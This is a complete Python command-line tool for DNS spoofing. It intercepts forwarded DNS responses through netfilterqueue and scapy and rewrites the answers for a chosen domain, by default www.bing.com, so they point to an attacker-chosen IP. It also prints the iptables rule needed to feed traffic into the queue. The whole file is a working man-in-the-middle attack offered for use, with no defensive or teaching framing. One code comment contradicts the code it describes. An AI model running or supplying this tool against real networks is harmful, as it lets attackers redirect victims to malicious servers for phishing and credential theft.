#!/usr/bin/env python3
import argparse
import signal
import sys

import netfilterqueue
import scapy.all as scapy


def spoof_dns(scapy_packet, spoof_ip):
    """Replace all DNS answers with a spoofed record."""
    qname = scapy_packet[scapy.DNSQR].qname

    answer = scapy.DNSRR(rrname=qname, rdata=spoof_ip, ttl=300)
    scapy_packet[scapy.DNS].an = answer
    scapy_packet[scapy.DNS].ancount = 1

    # Delete checksums and lengths so Scapy recalculates them
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.UDP].len
    del scapy_packet[scapy.UDP].chksum

    return bytes(scapy_packet)


def process_packet(packet, target_domain, spoof_ip):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        # qname is bytes; decode it for a reliable comparison
        qname = scapy_packet[scapy.DNSQR].qname.decode(errors="ignore").strip(".")

        if target_domain in qname.lower():
            print(f"[+] Spoofing DNS response for: {qname} -> {spoof_ip}")
            payload = spoof_dns(scapy_packet, spoof_ip)
            packet.set_payload(payload)

    packet.accept()


def main():
    parser = argparse.ArgumentParser(description="DNS spoofing tool using netfilterqueue")
    parser.add_argument("-d", "--domain", default="www.bing.com", help="Target domain to spoof (default: www.bing.com)")
    parser.add_argument("-i", "--spoof-ip", default="192.168.1.130", help="IP address to redirect the domain to")
    parser.add_argument("-q", "--queue-number", type=int, default=0, help="NFQUEUE number to bind to (default: 0)")
    args = parser.parse_args()

    # Match by qname bytes, so keep it as bytes with a trailing dot
    target_domain = args.domain.lower()

    def callback(packet):
        process_packet(packet, target_domain, args.spoof_ip)

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(args.queue_number, callback)

    def shutdown(signum, frame):
        print("\n[*] Stopping DNS spoofer...")
        queue.unbind()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)

    print(f"[*] DNS spoofer running | domain: {args.domain} -> {args.spoof_ip} | queue: {args.queue_number}")
    try:
        queue.run()
    except Exception as e:
        print(f"[!] Queue error: {e}")
        print("[!] Make sure the iptables rule is active, e.g.:")
        print("    iptables -I FORWARD -j NFQUEUE --queue-num 0")
        sys.exit(1)


if __name__ == "__main__":
    main()
